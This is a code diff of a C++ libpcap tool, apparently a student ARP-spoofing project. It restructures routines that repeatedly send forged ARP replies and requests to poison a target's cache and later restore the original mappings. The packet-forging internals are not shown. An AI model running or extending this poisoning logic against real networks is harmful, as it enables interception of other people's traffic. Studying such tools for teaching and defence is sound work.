@@ -29,7 +29,7 @@ static u_char g_free_arp = 0;
  * Mandatory global
  */
 static Pcap *g_pcap = NULL;
-pcap_t *g_pcap_t = NULL;
+static pcap_t *g_pcap_t = NULL;
 
 void	signal_handler(int sig) {
 	if (sig == SIGINT) {
@@ -37,6 +37,7 @@ void	signal_handler(int sig) {
 		if (g_pcap_t) {
 			pcap_breakloop(g_pcap_t);
 		}
+		std::cout << "STOP" << std::endl;
 	}
 }
 
@@ -52,7 +53,7 @@ void	timer_handler(int sig) {
  * otherwise use thread
  * infect
  */
-int start_poison(Pcap &c_pcap) {
+/*int start_poison(Pcap &c_pcap) {
 	//char buf[sizeof(struct ether_header) + sizeof(ether_arp)] = {0};
 	int res = c_pcap.setSelfMac();
 
@@ -64,7 +65,16 @@ int start_poison(Pcap &c_pcap) {
 		std::cout << "res error << std::endl;" << std::endl;
 		return 1;
 	}
-	c_pcap.forgePacket(false);
+//	c_pcap.forgePacketReply(false);
+	printf("ret timer: %d\n", setitimer(ITIMER_REAL, &timer, NULL));
+	g_pcap = &c_pcap;
+	return 0;
+}*/
+
+/*
+ * Source is at poison ether target ip
+ */
+int poison_reply(Pcap &c_pcap) {
 	struct timeval time = {
 		.tv_sec = 1,
 		.tv_usec = 0
@@ -74,20 +84,48 @@ int start_poison(Pcap &c_pcap) {
 		.it_value = time
 	};
 
-		//printf("res:%d\n", pcap_sendpacket(c_pcap.GetDeviceCapture(), (const u_char *)buf, sizeof(buf)));
-	g_pcap = &c_pcap;
-	printf("ret timer: %d\n", setitimer(ITIMER_REAL, &timer, NULL));
+	pcap_t *device = c_pcap.GetDeviceCapture();
+	if (!device)
+		return 1;
 	std::signal(SIGALRM, timer_handler);
+	g_pcap_t = device;
+	g_pcap = &c_pcap;
+	c_pcap.forgePacketReply(false);
+	printf("ret timer: %d\n", setitimer(ITIMER_REAL, &timer, NULL));
+	return 0;
+}
+
+/*
+ * Who has target? tell poison
+ */
+int poison_request(Pcap &c_pcap, bool recover) {
+	c_pcap.forgePacketRequest(recover);
+	printf("request s: %d\n", c_pcap.sendPacket());
 	return 0;
 }
 
 int loop_filter(Pcap &c_pcap) {
+	std::cout << "loop filter" << std::endl;
 	pcap_t *device = c_pcap.GetDeviceCapture();
 	if (!device)
 		return 1;
-	g_pcap_t = device;
+	std::cout << "loop filter apres" << std::endl;
+	int res = c_pcap.setSelfMac();
+
+	printf("ret self: %d\n", res);
+	if (res) {
+		if (res == PCAP_ERROR)
+			std::cerr << "No device found" << std::endl;
+		printf("ret: %d", res);
+		std::cout << "res error << std::endl;" << std::endl;
+		return 1;
+	}
+	std::cout<<"request act"<<std::endl;
+	poison_request(c_pcap, false);
 	std::signal(SIGINT, signal_handler);
-	start_poison(c_pcap);
+	poison_reply(c_pcap);
+	std::cout<<"reply act"<<std::endl;
+	//start_poison(c_pcap);
 	return c_pcap.loopPcap(device);
 	//loop {
 	//
@@ -141,16 +179,17 @@ int start_capture(Pcap &c_pcap) {
 			pcap_perror(c_pcap.GetDeviceCapture(),
 				"Set filter failed");
 			return 1;
+		
 		}
 		return loop_filter(c_pcap);
 	} catch (std::runtime_error& err) {
-		std::cerr << err.what() << std::endl;
+		std::cerr << "Runtime: " << err.what() << std::endl;
 		return 1;
 	} catch (std::bad_alloc& err) {
-		std::cerr << err.what() << std::endl;
+		std::cerr << "Bad alloc: " << err.what() << std::endl;
 		return 1;
 	} catch (std::exception& err) {
-		std::cerr << err.what() << std::endl;
+		std::cerr << "Exception: " << err.what() << std::endl;
 		return 1;
 	}
 }
@@ -202,11 +241,16 @@ int main(int argc, char *argv[]) {
 		return start_capture(c_pcap_2);
 	}*/
 	res = start_capture(c_pcap);
+	std::cout << "RESS:" << res << std::endl;
 	if (g_free_arp == 1) {
 		alarm(0);
 		std::signal(SIGALRM, SIG_DFL);
-		c_pcap.forgePacket(true);
+		/* inverser target sur src  */
+		poison_request(c_pcap, true);
+		c_pcap.forgePacketReply(true);
 		std::cout << "Send 4x original ARP to target...";
+		printf("s: %d\n", c_pcap.sendPacket());
+		sleep(1);
 		printf("s: %d\n", c_pcap.sendPacket());
 		sleep(1);
 		printf("s: %d\n", c_pcap.sendPacket());
